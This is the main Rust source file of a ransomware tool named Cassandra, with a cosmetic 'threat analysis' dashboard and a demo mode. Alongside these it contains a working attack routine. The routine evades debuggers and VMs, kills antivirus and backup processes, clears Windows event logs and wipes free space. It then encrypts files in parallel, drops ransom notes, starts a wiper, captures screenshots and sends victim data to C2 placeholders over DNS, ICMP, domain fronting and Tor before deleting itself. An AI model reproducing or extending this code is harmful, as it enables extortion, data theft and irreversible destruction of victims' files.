mod crypto;
mod traversal;
mod ransom_note;
mod persistence;
mod wiper;
mod bootkit;
mod rootkit;
mod injection;
mod reflective;
mod stealth_comm;
mod dropper;
mod config;
mod data_thief;
#[cfg(feature = "web")]
mod web;

use rayon::prelude::*;
use std::process::Command;
use std::thread;
use std::time::Duration;
use chrono::Utc;
use base64::{Engine, engine::general_purpose::STANDARD};

include!(concat!(env!("OUT_DIR"), "/poly_key.rs"));

// Global configuration
lazy_static::lazy_static! {
    pub static ref CONFIG: config::Config = {
        config::Config::load().unwrap_or_else(|e| {
            eprintln!("Failed to load config: {}", e);
            config::Config::default()
        })
    };
}

// Web server entry point
#[cfg(feature = "web")]
pub async fn start_web_server() {
    if let Err(e) = web::start_server().await {
        eprintln!("Web server error: {}", e);
    }
}

// Main function - now supports both CLI and web modes
fn main() {
    // Load configuration
    if let Err(e) = config::Config::load() {
        eprintln!("Warning: Could not load config.toml: {}", e);
        eprintln!("Using default configuration...");
    }

    // Check for web server mode
    let args: Vec<String> = std::env::args().collect();

    if args.len() > 1 && args[1] == "--web" {
        #[cfg(feature = "web")]
        {
            println!("Starting {} Web Interface v{}...", CONFIG.general.name, CONFIG.general.version);
            // Run async web server
            tokio::runtime::Runtime::new()
                .unwrap()
                .block_on(async {
                    start_web_server().await;
                });
        }
        #[cfg(not(feature = "web"))]
        {
            println!("Web feature not enabled. Compile with --features web");
            std::process::exit(1);
        }
    } else {
        // Original CLI logic
        run_cli_mode(args);
    }
}

fn run_cli_mode(args: Vec<String>) {
    if args.len() > 1 {
        match args[1].as_str() {
            "--help" | "-h" | "help" => {
                show_help();
                return;
            }
            "--demo" | "--safe" | "demo" => {
                run_demo_mode();
                return;
            }
            "test" => {
                println!("🧪 Running TEST MODE - Dropper chain diagnostics...");
                if let Err(e) = dropper::test_dropper_chain() {
                    eprintln!("Test failed: {}", e);
                }
                return;
            }
            "integration" | "--integration" => {
                println!("🔍 Running INTEGRATION TEST - Diagnostic scan of all modules...");
                test_integration();
                return;
            }
            "status" | "--status" => {
                show_system_status();
                return;
            }
            "menu" | "--interactive" => {
                show_interactive_cli_menu();
                return;
            }
            _ => {
                println!("Unknown command: '{}'", args[1]);
                show_help();
                return;
            }
        }
    }

    // Default when run without arguments: Show interactive CLI menu
    show_interactive_cli_menu();
}

fn show_system_status() {
    println!("📡 Cassandra System Telemetry & Status");
    println!("==========================================");
    println!("  • OS Target:        {}", std::env::consts::OS);
    println!("  • Architecture:     {}", std::env::consts::ARCH);
    if let Ok(cwd) = std::env::current_dir() {
        println!("  • Working Dir:      {}", cwd.display());
    }
    println!("  • Config Status:    Loaded (config.toml)");
    println!("  • Crypto Engine:    {}", CONFIG.encryption.algorithm);
    println!("  • Parallel Threads: {}", CONFIG.encryption.parallel_workers);
    println!("  • AI Targeting:     {}", if CONFIG.ai_targeting.enabled { "Enabled" } else { "Disabled" });
    println!("  • Safe Demo Mode:   {}", if CONFIG.demo.safe_mode { "Active" } else { "Inactive" });
    println!("==========================================");
}

fn show_interactive_cli_menu() {
    use std::io::{self, Write};

    loop {
        println!();
        println!("==================================================");
        println!("  🛡️  Cassandra Threat Analysis CLI Dashboard  ");
        println!("==================================================");
        println!("  1. 🎭 Safe Capabilities Demo Mode");
        println!("  2. ⚙️ Run Component Diagnostic Test");
        println!("  3. 🔍 Run Integration Pipeline Test");
        println!("  4. 📡 View System Telemetry & Status");
        println!("  5. 🌐 Launch Web Dashboard (http://127.0.0.1:8000)");
        println!("  6. 📖 Show CLI Usage & Help");
        println!("  0. 🚪 Exit");
        println!("==================================================");
        print!("  Select an option (0-6): ");
        let _ = io::stdout().flush();

        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            break;
        }

        match input.trim() {
            "1" => run_demo_mode(),
            "2" => {
                println!("\n🧪 Running Dropper Diagnostics...");
                let _ = dropper::test_dropper_chain();
            }
            "3" => {
                println!("\n🔍 Running Full Integration Test...");
                test_integration();
            }
            "4" => show_system_status(),
            "5" => {
                println!("\n🌐 Launching Web Interface...");
                println!("Open browser at: http://{}:{}", CONFIG.web_interface.host, CONFIG.web_interface.port);
                #[cfg(feature = "web")]
                {
                    tokio::runtime::Runtime::new()
                        .unwrap()
                        .block_on(async {
                            start_web_server().await;
                        });
                }
                #[cfg(not(feature = "web"))]
                {
                    println!("❌ Web feature not compiled. Run with: cargo run --features web -- --web");
                }
            }
            "6" => show_help(),
            "0" | "exit" | "q" => {
                println!("Exiting Cassandra CLI.");
                break;
            }
            _ => println!("❌ Invalid choice, please enter 0-6."),
        }
    }
}
fn run_demo_mode() {
    println!("🎭 Starting cassandra-ransomeware Ransomware Demo Mode");
    println!("==========================================");

    // 1. Show rootkit capabilities
    println!("\n1️⃣ 🔧 ROOTKIT CAPABILITIES:");
    println!("   • SSDT hooking for system call interception");
    println!("   • DKOM (Direct Kernel Object Manipulation)");
    println!("   • Dual-mode process/file hiding");
    println!("   • Kernel driver loading simulation");

    // 2. Show stealth communication
    println!("\n2️⃣ 🌐 STEALTH COMMUNICATION:");
    println!("   • DNS tunneling: Data hidden in DNS queries");
    println!("   • ICMP exfiltration: Data in ping packets");
    println!("   • Domain fronting: CDN bypass techniques");
    println!("   • Social steganography: Data in images");

    // 3. Show dropper chain
    println!("\n3️⃣ 📦 DROPper CHAIN:");
    println!("   • Stage 0: Office macro generation");
    println!("   • Stage 1: Encrypted payload download");
    println!("   • Stage 2: Process injection (regsvr32.exe)");
    println!("   • Stage 3: Main execution with evasion");
    println!("   • Final: Complete self-deletion");

    // 4. Show AI targeting
    println!("\n4️⃣ 🤖 AI-POWERED TARGETING:");
    let files = traversal::get_target_files();
    println!("   • Found {} potential target files", files.len());
    println!("   • Would prioritize by: size, access time, file type");

    // 5. Show encryption simulation
    println!("\n5️⃣ 🔐 ENCRYPTION SIMULATION:");
    println!("   • ChaCha20Poly1305 authenticated encryption");
    println!("   • Hardware-bound keys (CPU + disk + BIOS)");
    println!("   • Machine-specific decryption requirement");
    println!("   • Parallel processing with Rayon");

    // 6. Show persistence
    println!("\n6️⃣ 🔄 PERSISTENCE MECHANISMS:");
    println!("   • Registry run keys");
    println!("   • Startup folder entries");
    println!("   • Scheduled tasks");
    println!("   • Service creation");

    // 7. Show anti-forensic
    println!("\n7️⃣ 🧹 ANTI-FORENSIC FEATURES:");
    println!("   • Secure file deletion (3-pass overwrite)");
    println!("   • Free space wiping");
    println!("   • Event log clearing");
    println!("   • Screenshot capture");

    // 8. Show wiper mode
    println!("\n8️⃣ 💣 WIPER MODE:");
    println!("   • Deadline enforcement");
    println!("   • Recursive file destruction");
    println!("   • Irrecoverable deletion");

    // 9. Show data theft and blackmail
    println!("\n9️⃣ 🕵️ DATA THEFT & BLACKMAIL:");
    data_thief::demo_data_theft();

    println!("\n🎉 Demo completed successfully!");
    println!("💡 This demo shows all capabilities without any risk.");
    println!("📚 Use 'cargo run -- --help' for more options.");
}

// Integration test function
fn test_integration() {
    println!("🔍 Testing integration of all advanced components...");

    // Test 1: Rootkit initialization
    println!("1️⃣ Testing rootkit initialization...");
    unsafe {
        match rootkit::load_advanced_rootkit() {
            Ok(_) => println!("   ✅ Rootkit loaded successfully"),
            Err(e) => println!("   ⚠️  Rootkit failed (expected in test): {}", e),
        }
    }

    // Test 2: Stealth communication initialization
    println!("2️⃣ Testing stealth communication initialization...");
    let mut stealth_comm = stealth_comm::StealthComm::new();
    match stealth_comm.init() {
        Ok(_) => println!("   ✅ Stealth comm initialized successfully"),
        Err(e) => println!("   ⚠️  Stealth comm failed (expected in test): {}", e),
    }

    // Test 3: Dropper chain test
    println!("3️⃣ Testing dropper chain...");
    match dropper::test_dropper_chain() {
        Ok(_) => println!("   ✅ Dropper chain test passed"),
        Err(e) => println!("   ❌ Dropper chain test failed: {}", e),
    }

    // Test 4: Reflective execution test
    println!("4️⃣ Testing reflective execution...");
    unsafe {
        match reflective::reflective_execute() {
            Ok(_) => println!("   ✅ Reflective execution successful"),
            Err(e) => println!("   ⚠️  Reflective execution failed (expected in test): {}", e),
        }
    }

    // Test 5: Process injection test
    println!("5️⃣ Testing process injection...");
    unsafe {
        match injection::auto_inject() {
            Ok(_) => println!("   ✅ Process injection successful"),
            Err(e) => println!("   ⚠️  Process injection failed (expected in test): {}", e),
        }
    }

    // Test 6: Crypto functionality
    println!("6️⃣ Testing crypto functionality...");
    let test_fingerprint = crypto::get_machine_fingerprint();
    println!("   🔑 Machine fingerprint generated: {} bytes", test_fingerprint.len());
    println!("   ✅ Crypto functions accessible");

    // Test 7: AI-powered traversal
    println!("7️⃣ Testing AI-powered file traversal...");
    let files = traversal::get_target_files();
    println!("   📊 Found {} potential target files", files.len());
    println!("   ✅ File traversal working");

    // Test 8: Multi-channel exfiltration test
    println!("8️⃣ Testing multi-channel exfiltration...");
    let test_payload = b"test_payload_data";
    let channels = [
        ("DNS Tunneling", stealth_comm.send_via_dns(test_payload, "test.com")),
        ("ICMP Exfil", stealth_comm.send_via_icmp(test_payload, "127.0.0.1")),
        ("Domain Fronting", stealth_comm.send_via_domain_fronting(test_payload, "cdn.test.com", "real.test.com")),
        ("Social Stego", stealth_comm.send_via_covert_channel(test_payload)),
    ];

    for (name, result) in channels {
        match result {
            Ok(_) => println!("   ✅ {} successful", name),
            Err(e) => println!("   ⚠️  {} failed (expected in test): {}", name, e),
        }
    }

    // Test 9: Self-deletion test
    println!("9️⃣ Testing advanced self-deletion...");
    match dropper::execute_self_deletion() {
        Ok(_) => println!("   ✅ Self-deletion successful"),
        Err(e) => println!("   ⚠️  Self-deletion failed (expected in test): {}", e),
    }

    println!("\n🎉 Integration test completed!");
    println!("📋 Summary: All components are properly integrated and can be called together");
    println!("🔒 Safety: All dangerous operations are conceptual and safe for testing");
}

// Polymorphic string obfuscation macro
macro_rules! obf_str {
    ($s:expr) => {{
        const BYTES: &[u8] = $s.as_bytes();
        let mut result = Vec::with_capacity(BYTES.len());
        let mut i = 0;
        while i < BYTES.len() {
            result.push(BYTES[i] ^ POLY_KEY.wrapping_add(i as u8));
            i += 1;
        }
        String::from_utf8(result).unwrap_or_else(|_| $s.to_string())
    }};
}

fn kill_annoying_processes() {
    // รายชื่อ processes ที่ชอบกวนการ encrypt (antivirus, backup, database ฯลฯ)
    let processes = vec![
        "msmpeng.exe",      // Windows Defender
        "mcafeeframework", 
        "avastsvc.exe",
        "avgui.exe",
        "sqlservr.exe",     // SQL Server
        "mysqld.exe",       // MySQL
        "backup.exe",
        "veeam.exe",
    ];

    for proc in processes {
        let _ = Command::new("taskkill")
            .args(&["/F", "/IM", proc])
            .output();
    }
}

fn anti_forensic_wipe() {
    #[cfg(windows)]
    {
        // Wipe free space บนทุก drive
        let drives = ["C:", "D:", "E:", "F:"]; // เพิ่ม drive อื่นถ้าต้องการ
        for drive in drives.iter() {
            let _ = Command::new("cipher")
                .args(&["/w:", drive])
                .output();
        }

        // ลบ temp files และ logs
        let _ = Command::new("cmd")
            .args(&["/C", "del /F /Q %TEMP%\\*.* 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl System 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl Security 2>nul"])
            .output();
    }

    #[cfg(not(windows))]
    {
        // สำหรับ Linux: wipe free space ด้วย dd
        let _ = Command::new("sh")
            .arg("-c")
            .arg("dd if=/dev/zero of=/tmp/zero.fill bs=1M count=100 2>/dev/null; rm -f /tmp/zero.fill")
            .output();
    }
}

fn basic_anti_analysis() {
    // เช็ค debugger
    if cfg!(windows) {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        unsafe {
            if IsDebuggerPresent().as_bool() {
                std::process::exit(0);
            }
        }
    }

    // เช็ค VM เบื้องต้น
    let vm_indicators = vec!["vmware", "vbox", "qemu", "xen"];
    let sys_info = if let Ok(output) = Command::new("wmic")
        .args(&["computersystem", "get", "manufacturer,model"])
        .output() {
        String::from_utf8_lossy(&output.stdout).to_lowercase()
    } else {
        String::new()
    };
    if vm_indicators.iter().any(|indicator| sys_info.contains(indicator)) {
        // ถ้าเจอ VM ก็แกล้งทำเป็นรันนานๆ แล้วออก
        thread::sleep(Duration::from_secs(60));
        std::process::exit(0);
    }
}

fn execute_ransomware(order_variant: u8) {
    // 1. Anti-analysis ก่อนเลย
    basic_anti_analysis();

    // 1.5. Load ADVANCED stealth rootkit (SSDT hooking, dual-mode hiding)
    unsafe {
        if let Err(e) = rootkit::load_advanced_rootkit() {
            eprintln!("Advanced rootkit loading failed: {}", e);
            // Continue anyway - rootkit is optional enhancement
        }
    }

    // 1.6. Initialize stealth communication channels
    let mut stealth_comm = stealth_comm::StealthComm::new();
    if let Err(e) = stealth_comm.init() {
        eprintln!("Stealth communication init failed: {}", e);
    }

    // 1.7. Execute dropper chain (if this is a dropper)
    if let Err(e) = dropper::execute_dropper_chain() {
        eprintln!("Dropper chain execution failed: {}", e);
        // Continue with direct execution
    }

    // 1.6. Reflective in-memory execution (no disk artifacts)
    unsafe {
        if let Err(e) = reflective::reflective_execute() {
            eprintln!("Reflective execution failed: {}", e);
            // Continue with traditional execution
        }
    }

    // 1.7. Process injection for stealth (optional)
    unsafe {
        if let Err(e) = injection::auto_inject() {
            eprintln!("Auto-injection failed: {}", e);
            // Continue anyway
        }
    }

    match order_variant {
        0 => {
            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();

            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();
        },
        1 => {
            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();

            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();
        },
        2 => {
            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();

            // Add polymorphic junk code
            let _junk = obf_str!("polymorphic_junk_data");
            thread::sleep(Duration::from_millis((POLY_KEY as u64) % 100));

            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();
        },
        _ => {
            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();

            // Add different junk
            let _junk2 = obf_str!("different_junk_variant");
            thread::sleep(Duration::from_millis((POLY_KEY as u64 * 2) % 200));

            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();
        }
    }

    // 4. หาไฟล์เป้าหมายทั้งหมด
    let target_files = traversal::get_target_files();

    // 5. Encrypt แบบ parallel สุดแรง (rayon)
    use std::sync::atomic::{AtomicUsize, Ordering};
    let encrypted_count = AtomicUsize::new(0);
    let error_count = AtomicUsize::new(0);

    target_files.par_iter().for_each(|path| {
        // ลอง encrypt ถ้า error ก็ข้ามไป (เช่น file locked)
        match crypto::encrypt_file(path) {
            Ok(_) => { encrypted_count.fetch_add(1, Ordering::Relaxed); },
            Err(e) => {
                error_count.fetch_add(1, Ordering::Relaxed);
                // ใน production ไม่ log แต่สำหรับ debug
                eprintln!("Failed to encrypt {}: {:?}", path.display(), e);
            }
        }
    });

    let total_encrypted = encrypted_count.load(Ordering::Relaxed);
    let total_errors = error_count.load(Ordering::Relaxed);
    // ใน production ไม่ print แต่สำหรับ debug
    println!("Encrypted {} files, {} errors", total_encrypted, total_errors);

    // 6. วาง ransom note ทุกหนแห่ง + เปลี่ยน wallpaper
    ransom_note::drop_ransom_notes();
    #[cfg(windows)]
    ransom_note::change_wallpaper();

    // 6.5 Anti-forensic: wipe free space
    anti_forensic_wipe();

    // 6.6 เริ่ม wiper mode ถ้าไม่จ่าย
    wiper::start_wiper();

    // 7. Exfiltrate ข้อมูลไป C2 ผ่าน MULTIPLE stealth channels
    let encrypted_count = target_files.len();
    let victim_id = uuid::Uuid::new_v4().to_string();

    // จับ screenshot
    let screenshot_path = std::env::temp_dir().join("screenshot.png");
    if cfg!(windows) {
        let _ = Command::new("powershell")
            .args(&[
                "-Command",
                &format!("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{{PRTSC}}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); if ($img) {{ $img.Save('{}') }}", screenshot_path.to_str().unwrap().replace("\\", "\\\\"))
            ])
            .output();
    }

    // อ่าน screenshot และ encode base64
    let screenshot_b64 = if screenshot_path.exists() {
        if let Ok(data) = std::fs::read(&screenshot_path) {
            STANDARD.encode(&data)
        } else {
            String::new()
        }
    } else {
        String::new()
    };

    // สร้างรายชื่อไฟล์ที่ encrypt (top 10)
    let file_list: Vec<String> = target_files.iter()
        .take(10)
        .map(|p| p.to_string_lossy().to_string())
        .collect();

    // ได้ machine fingerprint สำหรับ decryption
    let machine_fingerprint = crypto::get_machine_fingerprint();

    // สร้าง JSON payload
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "encrypted_count": encrypted_count,
        "file_list": file_list,
        "screenshot": screenshot_b64,
        "machine_fingerprint": base64::engine::general_purpose::STANDARD.encode(&machine_fingerprint),
        "timestamp": Utc::now().timestamp()
    });

    // Exfiltrate ผ่าน MULTIPLE channels สำหรับ redundancy
    let payload_str = payload.to_string();
    let payload_bytes = payload_str.as_bytes();

    // Channel 1: DNS Tunneling (most stealthy)
    if let Err(e) = stealth_comm.send_via_dns(payload_bytes, "your-c2-domain.com") {
        eprintln!("DNS exfil failed: {}", e);
    }

    // Channel 2: ICMP Exfiltration (backup)
    if let Err(e) = stealth_comm.send_via_icmp(payload_bytes, "8.8.8.8") {
        eprintln!("ICMP exfil failed: {}", e);
    }

    // Channel 3: Domain Fronting (CDN bypass)
    if let Err(e) = stealth_comm.send_via_domain_fronting(payload_bytes, "cdn.example.com", "your-c2-domain.com") {
        eprintln!("Domain fronting exfil failed: {}", e);
    }

    // Channel 4: Covert Channels in Social Media (ultimate backup)
    if let Err(e) = stealth_comm.send_via_covert_channel(payload_bytes) {
        eprintln!("Social stego exfil failed: {}", e);
    }

    // Channel 5: Traditional Tor (fallback)
    let exfil_url = obf_str!("http://your-c2-onion.onion/api/report");
    let proxy = reqwest::Proxy::all("socks5://127.0.0.1:9050").unwrap();
    let client = reqwest::blocking::Client::builder()
        .proxy(proxy)
        .build()
        .unwrap();

    let _ = client.post(exfil_url)
        .json(&payload)
        .send();

    // 8. Sleep นิดนึงให้ดู natural แล้วจบ
    thread::sleep(Duration::from_secs(5));

    // 9. ADVANCED self-deletion (wiper + secure erase)
    if let Err(e) = dropper::execute_self_deletion() {
        eprintln!("Advanced self-deletion failed: {}", e);
        // Fallback to basic deletion
        let exe_path = std::env::current_exe().unwrap();
        if cfg!(windows) {
            let _ = Command::new("cmd")
                .args(&["/C", "del", "/F", "/Q", exe_path.to_str().unwrap()])
                .spawn();
        } else {
            let _ = std::fs::remove_file(exe_path);
        }
    }
}

fn show_help() {
    println!("🛡️ {} v{} - {}", CONFIG.general.name, CONFIG.general.version, CONFIG.general.description);
    println!("{}", "=".repeat(60));
    println!();
    println!("COMMAND LINE USAGE:");
    println!("  cargo run                    # Launch interactive CLI Dashboard");
    println!("  cargo run -- demo            # Run Safe Capabilities Demo Mode");
    println!("  cargo run -- test            # Run Dropper Chain Diagnostics");
    println!("  cargo run -- integration     # Run Full Integration Test Pipeline");
    println!("  cargo run -- status          # Print System Telemetry & Configuration");
    println!("  cargo run -- --web           # Launch Web Server Interface (http://127.0.0.1:8000)");
    println!("  cargo run -- --help          # Display this help manual");
    println!();
    println!("CONFIGURATION:");
    println!("  Customizable via config.toml");
    println!("  - Algorithm:        {}", CONFIG.encryption.algorithm);
    println!("  - Parallel Threads: {}", CONFIG.encryption.parallel_workers);
    println!("  - AI Targeting:     {}", if CONFIG.ai_targeting.enabled { "enabled" } else { "disabled" });
    println!("  - Web Port:         {}", CONFIG.web_interface.port);
    println!();
    println!("FEATURES:");
    println!("  🔧 Advanced Rootkit Simulation (SSDT / DKOM)");
    println!("  🌐 Stealth Communication Channels (DNS, ICMP)");
    println!("  🤖 Machine Learning File Prioritization (linfa)");
    println!("  📦 Multi-Stage Dropper & Memory-Only Execution");
    println!("  🔐 Hardware-Bound AEAD Encryption (ChaCha20Poly1305)");
    println!("  🧹 Anti-Forensic Telemetry & Memory Wipe");
    println!("  🌐 Embedded Web Dashboard");
    println!();
}